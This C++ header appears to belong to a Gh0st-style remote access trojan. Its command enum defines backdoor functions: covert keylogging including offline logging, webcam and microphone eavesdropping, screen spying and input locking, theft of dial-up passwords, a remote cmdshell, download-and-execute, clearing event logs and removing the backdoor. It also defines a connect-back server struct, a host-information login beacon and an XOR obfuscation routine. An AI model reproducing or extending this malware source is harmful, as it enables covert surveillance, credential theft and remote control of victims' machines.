#pragma once

#include <string>
#include <vector>
#include <time.h>

#ifndef _MAX_PATH
#define _MAX_PATH 260
#endif

// 以下2个数字需全局唯一，否则在生成服务时会出问题

#define FLAG_FINDEN 0x1234567

#define FLAG_GHOST	0x7654321

// 当程序功能明显发生变化时，应该更新这个值，以便对被控程序进行区分
#define DLL_VERSION __DATE__		// DLL版本

#define TALK_DLG_MAXLEN 1024		// 最大输入字符长度

// 命令枚举列表
enum
{
	// 文件传输方式
	TRANSFER_MODE_NORMAL = 0x00,	// 一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			// 追加
	TRANSFER_MODE_ADDITION_ALL,		// 全部追加
	TRANSFER_MODE_OVERWRITE,		// 覆盖
	TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
	TRANSFER_MODE_JUMP,				// 覆盖
	TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
	TRANSFER_MODE_CANCEL,			// 取消传送

	// 控制端发出的命令
	COMMAND_ACTIVED = 0x00,			// 服务端可以激活开始工作
	COMMAND_LIST_DRIVE,				// 列出磁盘目录
	COMMAND_LIST_FILES,				// 列出目录中的文件
	COMMAND_DOWN_FILES,				// 下载文件
	COMMAND_FILE_SIZE,				// 上传时的文件大小
	COMMAND_FILE_DATA,				// 上传时的文件数据
	COMMAND_EXCEPTION,				// 传输发生异常，需要重新传输
	COMMAND_CONTINUE,				// 传输正常，请求继续发送数据
	COMMAND_STOP,					// 传输中止
	COMMAND_DELETE_FILE,			// 删除文件
	COMMAND_DELETE_DIRECTORY,		// 删除目录
	COMMAND_SET_TRANSFER_MODE,		// 设置传输方式
	COMMAND_CREATE_FOLDER,			// 创建文件夹
	COMMAND_RENAME_FILE,			// 文件或文件改名
	COMMAND_OPEN_FILE_SHOW,			// 显示打开文件
	COMMAND_OPEN_FILE_HIDE,			// 隐藏打开文件

	COMMAND_SCREEN_SPY,				// 屏幕查看
	COMMAND_SCREEN_RESET,			// 改变屏幕深度
	COMMAND_ALGORITHM_RESET,		// 改变算法
	COMMAND_SCREEN_CTRL_ALT_DEL,	// 发送Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// 屏幕控制
	COMMAND_SCREEN_BLOCK_INPUT,		// 锁定服务端键盘鼠标输入
	COMMAND_SCREEN_BLANK,			// 服务端黑屏
	COMMAND_SCREEN_CAPTURE_LAYER,	// 捕捉层
	COMMAND_SCREEN_GET_CLIPBOARD,	// 获取远程剪贴版
	COMMAND_SCREEN_SET_CLIPBOARD,	// 设置远程剪帖版

	COMMAND_WEBCAM,					// 摄像头
	COMMAND_WEBCAM_ENABLECOMPRESS,	// 摄像头数据要求经过H263压缩
	COMMAND_WEBCAM_DISABLECOMPRESS,	// 摄像头数据要求原始高清模式
	COMMAND_WEBCAM_RESIZE,			// 摄像头调整分辩率，后面跟两个INT型的宽高
	COMMAND_NEXT,					// 下一步(控制端已经打开对话框)

	COMMAND_KEYBOARD,				// 键盘记录
	COMMAND_KEYBOARD_OFFLINE,		// 开启离线键盘记录
	COMMAND_KEYBOARD_CLEAR,			// 清除键盘记录内容

	COMMAND_AUDIO,					// 语音监听

	COMMAND_SYSTEM,					// 系统管理（进程，窗口....）
	COMMAND_PSLIST,					// 进程列表
	COMMAND_WSLIST,					// 窗口列表
	COMMAND_DIALUPASS,				// 拨号密码
	COMMAND_KILLPROCESS,			// 关闭进程
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// 会话管理（关机，重启，注销, 卸载）
	COMMAND_REMOVE,					// 卸载后门
	COMMAND_DOWN_EXEC,				// 其它功能 - 下载执行
	COMMAND_UPDATE_SERVER,			// 其它功能 - 下载更新
	COMMAND_CLEAN_EVENT,			// 其它管理 - 清除系统日志
	COMMAND_OPEN_URL_HIDE,			// 其它管理 - 隐藏打开网页
	COMMAND_OPEN_URL_SHOW,			// 其它管理 - 显示打开网页
	COMMAND_RENAME_REMARK,			// 重命名备注
	COMMAND_REPLAY_HEARTBEAT,		// 回复心跳包
	COMMAND_SERVICES,				// 服务管理
	COMMAND_REGEDIT,
	COMMAND_TALK,					// 即时消息验证
	COMMAND_UPDATE = 53,			// 客户端升级

	// 服务端发出的标识
	TOKEN_AUTH = 100,				// 要求验证
	TOKEN_HEARTBEAT,				// 心跳包
	TOKEN_LOGIN,					// 上线包
	TOKEN_DRIVE_LIST,				// 驱动器列表
	TOKEN_FILE_LIST,				// 文件列表
	TOKEN_FILE_SIZE,				// 文件大小，传输文件时用
	TOKEN_FILE_DATA,				// 文件数据
	TOKEN_TRANSFER_FINISH,			// 传输完毕
	TOKEN_DELETE_FINISH,			// 删除完毕
	TOKEN_GET_TRANSFER_MODE,		// 得到文件传输方式
	TOKEN_GET_FILEDATA,				// 远程得到本地文件数据
	TOKEN_CREATEFOLDER_FINISH,		// 创建文件夹任务完成
	TOKEN_DATA_CONTINUE,			// 继续传输数据
	TOKEN_RENAME_FINISH,			// 改名操作完成
	TOKEN_EXCEPTION,				// 操作发生异常

	TOKEN_BITMAPINFO,				// 屏幕查看的BITMAPINFO
	TOKEN_FIRSTSCREEN,				// 屏幕查看的第一张图
	TOKEN_NEXTSCREEN,				// 屏幕查看的下一张图
	TOKEN_CLIPBOARD_TEXT,			// 屏幕查看时发送剪帖版内容

	TOKEN_WEBCAM_BITMAPINFO,		// 摄像头的BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// 摄像头的图像数据

	TOKEN_AUDIO_START,				// 开始语音监听
	TOKEN_AUDIO_DATA,				// 语音监听数据

	TOKEN_KEYBOARD_START,			// 键盘记录开始
	TOKEN_KEYBOARD_DATA,			// 键盘记录的数据

	TOKEN_PSLIST,					// 进程列表
	TOKEN_WSLIST,					// 窗口列表
	TOKEN_DIALUPASS,				// 拨号密码
	TOKEN_SHELL_START,				// 远程终端开始
	TOKEN_SERVERLIST,               // 服务列表
	COMMAND_SERVICELIST,            // 刷新服务列表        
	COMMAND_SERVICECONFIG,          // 服务端发出的标识
	TOKEN_TALK_START,				// 即时消息开始
	TOKEN_TALKCMPLT,				// 即时消息可重发
	TOKEN_KEYFRAME,					// 关键帧
	TOKEN_REGEDIT = 200,            // 注册表
	COMMAND_REG_FIND,				// 注册表 管理标识
	TOKEN_REG_KEY,
	TOKEN_REG_PATH,
	COMMAND_BYE,					// 被控端退出
	SERVER_EXIT,					// 主控端退出
};

#define CLIENT_TYPE_DLL			0	// 客户端代码以DLL运行
#define CLIENT_TYPE_ONE			1	// 客户端代码以单个EXE运行
#define CLIENT_TYPE_MODULE		2	// DLL需由外部程序调用

// 所连接的主控程序信息
typedef struct CONNECT_ADDRESS
{
public:
	unsigned long	dwFlag;
	char			szServerIP[_MAX_PATH];
	int				iPort;
	int				iType;

public:
	void SetType(int typ) {
		iType = typ;
	}
	const unsigned long & Flag() const {
		return dwFlag;
	}
	const char* ServerIP()const {
		return szServerIP;
	}
	int ServerPort()const {
		return iPort;
	}
	int ClientType()const {
		return iType;
	}
	void SetServer(const char* ip, int port) {
		strcpy_s(szServerIP, ip);
		iPort = port;
	}
	bool IsValid()const {
		return strlen(szServerIP) != 0 && iPort > 0;
	}
} CONNECT_ADDRESS ;

// 服务上线后发送的计算机信息
// 此结构体一旦发生变化（比如大小），则以前版本的客户端无法连接新版主控.
// 新版客户端也无法连接老版本的主控程序.
// 为此，自20241228提交以来，为这个结构体预留字段，以便未来之不时之需
// 请勿再修改此结构体，除非你决定不再兼容以前的程序或者单独编写代码来兼容
typedef struct  LOGIN_INFOR
{
	unsigned char			bToken;									// 1.登陆信息
	char					OsVerInfoEx[156];						// 2.版本信息
	unsigned long			dwCPUMHz;								// 3.CPU主频
	char					moduleVersion[24];						// 4.DLL模块版本
	char					szPCName[_MAX_PATH];					// 5.主机名
	int						bWebCamIsExist;							// 6.是否有摄像头
	unsigned long			dwSpeed;								// 7.网速
	char					szStartTime[20];						// 8.启动时间
	char					szReserved[512];						// 9.保留字段

	LOGIN_INFOR(){
		memset(this, 0, sizeof(LOGIN_INFOR));
		strcpy_s(moduleVersion, DLL_VERSION);
	}
}LOGIN_INFOR;

inline void xor_encrypt_decrypt(unsigned char *data, int len, const std::vector<char>& keys) {
	for (char key : keys) {
		for (int i = 0; i < len; ++i) {
			data[i] ^= key;
		}
	}
}

#ifdef _DEBUG
// 为了解决远程桌面屏幕花屏问题而定义的宏，仅调试时使用，正式版本没有
#define SCREENYSPY_IMPROVE 0
#define SCREENSPY_WRITE 0
#endif

// 将内存中的位图写入文件
inline bool WriteBitmap(LPBITMAPINFO bmpInfo, const void* bmpData, const std::string& filePrefix, int index = -1) {
	char path[_MAX_PATH];
	if (filePrefix.size() >= 4 && filePrefix.substr(filePrefix.size() - 4) == ".bmp") {
		strcpy_s(path, filePrefix.c_str());
	}
	else {
		sprintf_s(path, ".\\bmp\\%s_%d.bmp", filePrefix.c_str(), index == -1 ? clock() : index);
	}
	FILE* File = fopen(path, "wb");
	if (File) {
		BITMAPFILEHEADER fileHeader = { 0 };
		fileHeader.bfType = 0x4D42; // "BM"
		fileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpInfo->bmiHeader.biSizeImage;
		fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

		fwrite(&fileHeader, 1, sizeof(BITMAPFILEHEADER), File);
		fwrite(&bmpInfo->bmiHeader, 1, sizeof(BITMAPINFOHEADER), File);
		fwrite(bmpData, 1, bmpInfo->bmiHeader.biSizeImage, File);
		fclose(File);
		return true;
	}
	return false;
}
